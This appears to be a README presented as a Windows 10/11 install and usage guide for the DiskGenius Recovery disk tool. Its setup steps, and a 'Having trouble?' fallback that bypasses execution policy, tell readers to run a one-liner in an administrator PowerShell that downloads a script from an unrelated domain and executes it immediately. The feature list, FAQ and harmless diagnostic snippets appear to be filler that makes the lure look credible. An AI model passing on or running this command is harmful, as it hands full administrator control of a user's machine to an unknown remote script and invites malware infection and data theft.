# DiskGenius Recovery — Windows Data & Recovery Guide (10 & 11)

Windows 10 & 11 · data recovery · data & recovery.

**DiskGenius Recovery** on **Windows 10 and 11** — data recovery and day-to-day notes for it teams and users protecting local data.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **DiskGenius Recovery** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

DiskGenius combines partition management, disk cloning, and file recovery for internal and external drives. Administrators use it to rebuild boot partitions, clone disks before hardware swap, and dig into NTFS structures when backups are missing.

Documented workflows include imaging a failing drive first, running read-only scans when possible, and exporting files to a different physical disk than the source.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- File recovery
- Partition tools
- Restore points
- Disk imaging
- Deep scan
- Job reports
- Preview files

## Use cases

- IT departments
- Home power users
- Small offices

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "DiskGenius-Recovery"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "DiskGenius*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`diskgenius` · `diskgenius-recovery` · `data-recovery` · `file-recovery` · `disk-recovery` · `partition-manager` · `partition-tools` · `disk-management`

## License

This repository is a third-party backup and recovery usage guide. Comply with applicable software licensing and local regulations.
